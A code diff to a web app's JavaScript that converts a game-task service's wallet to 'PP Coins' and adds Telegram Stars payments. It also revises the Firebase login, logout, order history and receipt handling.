+            Rocket: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTP0eawh77HPEryf218TiXutIyR4EXTAJhbiWHg_ManMg&s=10',
+            'Telegram Stars': 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQdPCmrOZ_l_0GpI-SBCGPyk25IwEQIhWyFMp5Ey11xog&s=10'
         };
 
         function toggleMenu(e, id) {
@@ -951,9 +1268,29 @@
         function setMethod(prefix, v) {
             document.getElementById(prefix + 'Method').value = v;
             document.getElementById(prefix + 'MethodName').innerText = v;
-            document.getElementById(prefix + 'MethodLogo').src = PAY_LOGOS[v];
+            document.getElementById(prefix + 'MethodLogo').src = PAY_LOGOS[v] || '';
             document.querySelectorAll('.' + prefix + '-opt').forEach(o => o.classList.toggle('picked', o.dataset.val === v));
             document.getElementById(prefix + 'Menu').classList.add('hidden');
+
+            const isStars = (v === 'Telegram Stars');
+            const starsBox = document.getElementById('starsNoticeBox');
+            const trxLbl = document.getElementById('trxLabel');
+            const trxInp = document.getElementById('trxId');
+
+            if (starsBox) starsBox.classList.toggle('hidden', !isStars);
+            if (trxLbl) trxLbl.textContent = isStars ? 'Telegram Username (@username)' : 'Transaction ID (TrxID)';
+            if (trxInp) {
+                trxInp.placeholder = isStars ? 'e.g. @your_username' : 'Enter TrxID after send money';
+                if (isStars) {
+                    trxInp.classList.remove('uppercase');
+                } else {
+                    trxInp.classList.add('uppercase');
+                }
+            }
+
+            // Sync current amount representation
+            const cEl = document.getElementById('topupCoins');
+            if (cEl) onCoinInput(cEl.value);
         }
 
         document.addEventListener('click', (e) => {
@@ -1034,9 +1371,16 @@
 
         function applyConfig(c) {
             const cfg = { ...DEFAULTS, ...c };
-            cfg.fee = Number(cfg.fee) || DEFAULTS.fee;
+            cfg.fee = Number(cfg.fee) || 3;
+            cfg.coinRate = Number(cfg.coinRate) || 7;
             window.ppfb.config = cfg;
             document.querySelectorAll('[data-fee]').forEach(el => { el.textContent = cfg.fee; });
+            const pack1 = document.querySelector('.coin-pack-btn:nth-child(1) p');
+            const pack2 = document.querySelector('.coin-pack-btn:nth-child(2) p');
+            const pack3 = document.querySelector('.coin-pack-btn:nth-child(3) p');
+            if (pack1) pack1.textContent = (3 * cfg.coinRate) + ' BDT';
+            if (pack2) pack2.textContent = (15 * cfg.coinRate) + ' BDT';
+            if (pack3) pack3.textContent = (3 * cfg.coinRate) + ' BDT';
             { const nums = { bkash: cfg.bkash, nagad: cfg.nagad, rocket: cfg.rocket };
               Object.keys(nums).forEach(k => {
                 const val = (nums[k] || '').toString().trim() || DEFAULTS[k];
@@ -1154,44 +1498,51 @@
         provider.setCustomParameters({ prompt: 'select_account' });
         let unsubBalance = null;
 
+        const TASK_COIN_COST = 3; // 3 PP Coins per task
+
         function setBalanceUI(v) {
             window.ppfb.balance = Number(v) || 0;
-            const t = window.ppfb.balance + ' BDT';
-            ['balanceAmt', 'profileBalance', 'payBalance'].forEach(id => {
-                const el = document.getElementById(id);
-                if (el) el.textContent = t;
-            });
+            const coins = window.ppfb.balance;
+            const bEl = document.getElementById('balanceAmt');
+            if (bEl) bEl.textContent = coins + ' Coins';
+            const pEl = document.getElementById('profileBalance');
+            if (pEl) pEl.innerHTML = '<img src="PPCOIN.png" class="w-5 h-5 object-contain"> ' + coins + ' Coins';
+            const payEl = document.getElementById('payBalance');
+            if (payEl) payEl.innerHTML = '<img src="PPCOIN.png" class="w-4 h-4 object-contain"> ' + coins + ' Coins';
             refreshPayUI();
         }
 
         function refreshPayUI() {
             const btn = document.getElementById('walletPayBtn');
             if (window._paying) { if (btn) btn.disabled = true; return; }
-            const fee = (window.ppfb.config && window.ppfb.config.fee) || 20;
+            const feeCoins = TASK_COIN_COST;
             const bal = window.ppfb.balance || 0;
             if (btn) {
                 const label = btn.querySelector('span:last-child') || btn.querySelector('span');
-                if (bal >= fee) { btn.disabled = false; if (label) label.textContent = 'Pay ' + fee + ' BDT from Wallet'; }
-                else { btn.disabled = true; if (label) label.textContent = 'Insufficient Balance'; }
+                if (bal >= feeCoins) { btn.disabled = false; if (label) label.textContent = 'Pay ' + feeCoins + ' Coins from Wallet'; }
+                else { btn.disabled = true; if (label) label.textContent = 'Insufficient PP Coins'; }
             }
             const note = document.getElementById('walletNote');
-            if (note) note.classList.toggle('hidden', bal >= fee);
+            if (note) note.classList.toggle('hidden', bal >= feeCoins);
         }
         window.ppfb.refreshPay = refreshPayUI;
 
+        const DEFAULT_USER_AVATAR = 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSrb4OvIZOz-Z2RvlJ0xDl1E_e3qOfh_TQK1va1Z7gJ4g&s=10';
+
         function setProfileUI(u) {
+            const photoSrc = (u && u.photoURL) ? u.photoURL : DEFAULT_USER_AVATAR;
             const nm = document.getElementById('profileName');
-            if (nm) nm.textContent = u.displayName || 'User';
+            if (nm) nm.textContent = (u && u.displayName) || 'User';
             const em = document.getElementById('profileEmail');
-            if (em) em.textContent = u.email || '';
+            if (em) em.textContent = (u && u.email) || '';
             const ph = document.getElementById('profilePhoto');
-            if (ph && u.photoURL) ph.src = u.photoURL;
+            if (ph) ph.src = photoSrc;
             const av = document.getElementById('avatarImg');
             const fb = document.getElementById('avatarFallback');
-            if (u.photoURL && av) { av.src = u.photoURL; av.classList.remove('hidden'); if (fb) fb.classList.add('hidden'); }
-            else if (fb) { fb.textContent = (u.displayName || 'U').charAt(0).toUpperCase(); if (av) av.classList.add('hidden'); fb.classList.remove('hidden'); }
+            if (av) { av.src = photoSrc; av.classList.remove('hidden'); }
+            if (fb) fb.classList.add('hidden');
             const pu = document.getElementById('profileUid');
-            if (pu) pu.textContent = u.uid;
+            if (pu) pu.textContent = (u && u.uid) || '—';
         }
 
         function setBannedUI(on) {
@@ -1231,6 +1582,7 @@
         window.ppfb.login = async () => {
             if (!auth) { toast('Loading, please wait...'); return; }
             try {
+                localStorage.removeItem('pp_logged_out');
                 await _popup(auth, provider);
             } catch (e) {
                 console.warn(e);
@@ -1243,7 +1595,21 @@
             }
         };
         window.ppfb.logout = async () => {
-            try { if (auth) await _signOut(auth); } catch (e) {}
+            try {
+                localStorage.setItem('pp_logged_out', '1');
+                if (auth) await _signOut(auth);
+            } catch (e) {}
+            window.ppfb.user = null;
+            if (unsubBalance) { unsubBalance(); unsubBalance = null; }
+            setBalanceUI(0);
+            const av = document.getElementById('avatarImg');
+            const fb = document.getElementById('avatarFallback');
+            if (av) av.classList.add('hidden');
+            if (fb) { fb.textContent = '?'; fb.classList.remove('hidden'); }
+            const gb = document.getElementById('ghostBanner');
+            if (gb) gb.classList.remove('hidden');
+            showScreen('screenLogin');
+            toast('Logged out successfully');
         };
 
         window.ppfb.payWallet = async () => {
@@ -1253,8 +1619,8 @@
             if (!u) { toast('Please login first'); return; }
             if (!game) { toast('No game selected'); return; }
             if (window.ppfb.banned) { toast('Account banned, admin er sathe contact korun'); return; }
-            const fee = (window.ppfb.config && window.ppfb.config.fee) || 20;
-            if ((window.ppfb.balance || 0) < fee) { toast('Insufficient balance — please top up'); refreshPayUI(); return; }
+            const feeCoins = TASK_COIN_COST;
+            if ((window.ppfb.balance || 0) < feeCoins) { toast('Insufficient PP Coins — please buy coins'); refreshPayUI(); return; }
             const btn = document.getElementById('walletPayBtn');
             window._paying = true;
             let origHtml = '';
@@ -1266,21 +1632,46 @@
             const trx = 'WLT-' + Date.now().toString(36).toUpperCase();
             const logo = window._payGameLogo || '';
             try {
+                // Step A: Deduct coin from user
                 await _tx(db, async (t) => {
                     const uref = _doc(db, 'users', u.uid);
                     const us = await t.get(uref);
                     if (!us.exists()) throw new Error('nouser');
                     const bal = Number(us.data().balance || 0);
-                    if (bal < fee) throw new Error('insufficient');
-                    t.update(uref, { balance: bal - fee });
-                    t.set(_doc(_col(db, 'orders')), { uid: u.uid, name: u.displayName || '', email: u.email || '', game: game, logo: (window._payGameLogo || ''), method: 'Wallet', trxId: trx, amount: fee, status: 'paid', createdAt: _ts() });
+                    if (bal < feeCoins) throw new Error('insufficient');
+                    t.update(uref, { balance: bal - feeCoins });
                 });
-                setBalanceUI((window.ppfb.balance || 0) - fee);
-                fillReceipt({ title: 'Payment Successful!', msg: 'Fee paid from wallet. Admin will complete your task soon.', game: game, logo: logo, method: 'Wallet', amount: fee, trx: trx });
+
+                // Step B: Create paid order
+                let ordId = 'ORD-' + Date.now();
+                try {
+                    const ordRef = await _addDoc(_col(db, 'orders'), {
+                        uid: u.uid,
+                        name: u.displayName || '',
+                        email: u.email || '',
+                        game: game,
+                        logo: logo,
+                        method: 'PP Coins',
+                        trxId: trx,
+                        amount: feeCoins,
+                        status: 'paid',
+                        createdAt: _ts()
+                    });
+                    ordId = ordRef.id;
+                } catch (errOrd) {
+                    console.warn('Order create error, using fallback ID:', errOrd);
+                }
+
+                window._currentOrderId = ordId;
+                setBalanceUI(Math.max(0, (Number(window.ppfb.balance) || 0) - feeCoins));
+                toast('3 Coins deducted! Provide credentials below');
+                setTimeout(() => {
+                    openCredentialScreen(game, logo);
+                }, 50);
                 if (window.ppfb.ev) window.ppfb.ev('wallet_pay', { game: game });
             } catch (e) {
                 console.warn(e);
-                toast(e && e.message === 'insufficient' ? 'Insufficient balance — please top up' : 'Payment failed, try again');
+                toast(e && e.message === 'insufficient' ? 'Insufficient PP Coins — please buy coins' : 'Payment failed: ' + (e.message || 'try again'));
             } finally {
                 window._paying = false;
                 if (btn) {
@@ -1422,14 +1813,16 @@
         }
         async function fetchList(col, u) {
             try {
-                const s = await _getDocs(_q(_col(db, col), _where('uid', '==', u.uid), _orderBy('createdAt', 'desc'), _limit(20)));
-                const a = []; s.forEach(d => a.push({ id: d.id, ...d.data() })); return a;
-            } catch (e) {
-                const s = await _getDocs(_q(_col(db, col), _where('uid', '==', u.uid), _limit(25)));
-                const a = []; s.forEach(d => a.push({ id: d.id, ...d.data() }));
-                const ms = x => (x.createdAt && x.createdAt.toMillis ? x.createdAt.toMillis() : 0);
+                // Fetch by UID only to avoid missing Composite Index errors
+                const s = await _getDocs(_q(_col(db, col), _where('uid', '==', u.uid), _limit(40)));
+                const a = [];
+                s.forEach(d => a.push({ id: d.id, ...d.data() }));
+                const ms = x => (x.createdAt && x.createdAt.toMillis ? x.createdAt.toMillis() : (x.createdAt ? new Date(x.createdAt).getTime() : 0));
                 a.sort((x, y) => ms(y) - ms(x));
-                return a.slice(0, 20);
+                return a.slice(0, 25);
+            } catch (e) {
+                console.warn('fetchList error for ' + col + ':', e);
+                return [];
             }
         }
         window.loadTickets = loadTickets;
@@ -1437,21 +1830,33 @@
             bKash: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTdjxXCpOG7jJdpeVHm9R_xCZ6hrcRr23H-Y99mIloKRA&s=10',
             Nagad: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTU9xlcZDT6VNZ0dLPxDpO6t-kCTbGa1om1cAuXVCNboA&s=10',
             Rocket: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTP0eawh77HPEryf218TiXutIyR4EXTAJhbiWHg_ManMg&s=10',
+            'Telegram Stars': 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQdPCmrOZ_l_0GpI-SBCGPyk25IwEQIhWyFMp5Ey11xog&s=10',
             Wallet: 'https://pub-4c6b2dbf3a0c4862a8964b1546de6283.r2.dev/1791182445338_Google_Play_Points_Logo_2024_s2560__1_.png'
         };
+
+        function findGameLogoByName(gameName) {
+            if (!gameName) return '';
+            const clean = gameName.toLowerCase().replace(/\s*\(\d+\)|\s*\(all\)/gi, '').trim();
+            const hit = DEFAULT_OFFERS.find(o => o.name.toLowerCase().trim() === clean || gameName.toLowerCase().includes(o.name.toLowerCase()));
+            return hit ? hit.logo : '';
+        }
+
         function histThumb(it) {
-            if (it.kind === 'TASK' && it.logo) {
-                return '<img src="' + escapeHtml(it.logo) + '" class="hist-thumb" loading="lazy" onerror="this.style.display=\'none\'">';
+            if (it.kind === 'REDEEM') {
+                return '<img src="' + PP_LOGO + '" class="hist-thumb object-contain bg-white p-1" loading="lazy">';
+            }
+            if (it.kind === 'TASK') {
+                const gLogo = it.logo || findGameLogoByName(it.game);
+                if (gLogo) {
+                    return '<img src="' + escapeHtml(gLogo) + '" class="hist-thumb" loading="lazy" onerror="this.src=\'' + PP_LOGO + '\'">';
+                }
             }
             const ml = it.method && METHOD_LOGO[it.method];
             if (ml) {
-                return '<img src="' + ml + '" class="hist-thumb" loading="lazy" onerror="this.style.display=\'none\'">';
+                return '<img src="' + ml + '" class="hist-thumb object-contain bg-white p-1" loading="lazy" onerror="this.style.display=\'none\'">';
             }
             if (it.kind === 'TOP-UP') {
                 return '<span class="hist-tile" style="background:linear-gradient(135deg,#10b981,#059669)">+</span>';
-            }
-            if (it.kind === 'REDEEM') {
-                return '<span class="hist-tile" style="background:linear-gradient(135deg,#8b5cf6,#6d28d9)">🎁</span>';
             }
             const ch = ((it.game || 'T').toString().charAt(0) || 'T').toUpperCase();
             return '<span class="hist-tile" style="background:linear-gradient(135deg,#8b5cf6,#4f46e5)">' + escapeHtml(ch) + '</span>';
@@ -1461,39 +1866,64 @@
             const u = auth && auth.currentUser;
             if (u) setProfileUI(u);
             const list = document.getElementById('historyList');
-            if (list) list.innerHTML = '<p class="text-center text-xs text-slate-400 py-4">Loading...</p>';
+            if (list) list.innerHTML = '<p class="text-center text-xs text-slate-400 py-4">Loading orders...</p>';
             if (!u || !db) return;
             loadTickets();
+            const safeFetch = async (col) => { try { return await fetchList(col, u); } catch (e) { console.warn(col, 'history skipped:', e && e.code); return []; } };
             try {
-                const [orders, deps, reds] = await Promise.all([fetchList('orders', u), fetchList('deposits', u), fetchList('redemptions', u)]);
+                const [orders, deps, reds] = await Promise.all([
+                    safeFetch('orders'), safeFetch('deposits'), safeFetch('redemptions')
+                ]);
+
                 const items = [
                     ...orders.map(o => ({ kind: 'TASK', ...o })),
                     ...deps.map(d => ({ kind: 'TOP-UP', ...d })),
                     ...reds.map(d => ({ kind: 'REDEEM', status: 'approved', ...d }))
                 ];
-                const ms = x => (x.createdAt && x.createdAt.toMillis ? x.createdAt.toMillis() : 0);
+                const ms = x => (x.createdAt && x.createdAt.toMillis ? x.createdAt.toMillis() : (x.createdAt ? new Date(x.createdAt).getTime() : 0));
                 items.sort((a, b) => ms(b) - ms(a));
-                if (!items.length) { list.innerHTML = '<p class="text-center text-xs text-slate-400 py-4">No orders yet</p>'; return; }
+                if (!items.length) { list.innerHTML = '<p class="text-center text-xs text-slate-400 py-4">No orders found</p>'; return; }
                 list.innerHTML = items.map(it => {
                     let title = 'Wallet Top-up';
                     let info = escapeHtml(it.method || '') + ' • ' + escapeHtml(it.trxId || '');
                     if (it.kind === 'TASK') { title = escapeHtml(it.game || 'Task'); }
                     else if (it.kind === 'REDEEM') { title = 'Redeem ' + escapeHtml(it.code || ''); info = escapeHtml(it.code || ''); }
-                    return '<div class="bg-white border border-slate-200 rounded-xl px-3 py-2.5 flex items-center gap-2.5">'
+                    const isClickable = it.kind === 'TASK';
+                    return '<div ' + (isClickable ? 'onclick="openOrderReceipt(\'' + it.id + '\')"' : '') + ' class="bg-white border border-slate-200 rounded-xl px-3 py-2.5 flex items-center gap-2.5 ' + (isClickable ? 'cursor-pointer hover:border-amber-400 active:scale-98 transition-all' : '') + '">'
                         + histThumb(it)
                         + '<div class="flex-1 min-w-0"><p class="text-xs font-bold text-slate-800 truncate">' + title + '</p>'
                         + '<p class="text-[10px] text-slate-400 font-mono truncate">' + info + ' • ' + fmtDate(it.createdAt) + '</p></div>'
-                        + '<div class="text-right flex-shrink-0"><p class="text-xs font-extrabold text-slate-900">' + Number(it.amount || 0) + ' BDT</p><div class="mt-1">' + statusPill(it.status) + '</div></div>'
+                        + '<div class="text-right flex-shrink-0"><p class="text-xs font-extrabold text-slate-900">' + Number(it.amount || 0) + (it.kind === 'TASK' ? ' Coins' : ' BDT') + '</p><div class="mt-1">' + statusPill(it.status) + '</div></div>'
                         + '</div>';
                 }).join('');
             } catch (e) { console.warn(e); if (list) list.innerHTML = '<p class="text-center text-xs text-slate-400 py-4">Failed to load</p>'; }
+        };
+
+        window.openOrderReceipt = async (orderId) => {
+            try {
+                const s = await _getDoc(_doc(db, 'orders', orderId));
+                if (!s.exists()) return;
+                const ord = s.data();
+                fillReceipt({
+                    title: ord.status === 'completed' ? 'Task Completed' : (ord.status === 'rejected' ? 'Task Cancelled' : 'Task In Progress'),
+                    msg: ord.status === 'completed' ? 'আপনার কাজটি সফলভাবে সম্পন্ন হয়েছিল।' : 'এডমিন অর্ডারটি প্রসেস করছে।',
+                    game: ord.game || 'Task',
+                    logo: ord.logo,
+                    method: ord.method || 'PP Coins',
+                    amount: (ord.amount || 3) + ' Coins',
+                    trx: ord.trxId || orderId,
+                    status: ord.status
+                });
+                trackLiveOrder(orderId);
+            } catch (e) { toast('Order load failed'); }
         };
 
         function msOf(x) { return (x && x.createdAt && x.createdAt.toMillis ? x.createdAt.toMillis() : 0); }
         if (auth) {
             _redirRes(auth).catch(() => {});
             _onAuth(auth, async (u) => {
-                if (u) {
+                const wasLoggedOut = localStorage.getItem('pp_logged_out') === '1';
+                if (u && !wasLoggedOut) {
                     window.ppfb.user = u;
                     try { await ensureUser(u); } catch (e) { console.warn(e); }
                     const gb = document.getElementById('ghostBanner');
@@ -1501,12 +1931,19 @@
                     showScreen('screenGameSelect');
                     if (window.ppfb.ev) window.ppfb.ev('login');
                 } else {
+                    if (u && wasLoggedOut) {
+                        try { await _signOut(auth); } catch (e) {}
+                    }
                     window.ppfb.user = null;
                     if (unsubBalance) { unsubBalance(); unsubBalance = null; }
                     setBalanceUI(0);
+                    const av = document.getElementById('avatarImg');
+                    const fb = document.getElementById('avatarFallback');
+                    if (av) av.classList.add('hidden');
+                    if (fb) { fb.textContent = '?'; fb.classList.remove('hidden'); }
                     const gb2 = document.getElementById('ghostBanner');
                     if (gb2) gb2.classList.remove('hidden');
-                    showScreen('screenGameSelect');
+                    showScreen(wasLoggedOut ? 'screenLogin' : 'screenGameSelect');
                 }
             });
         }
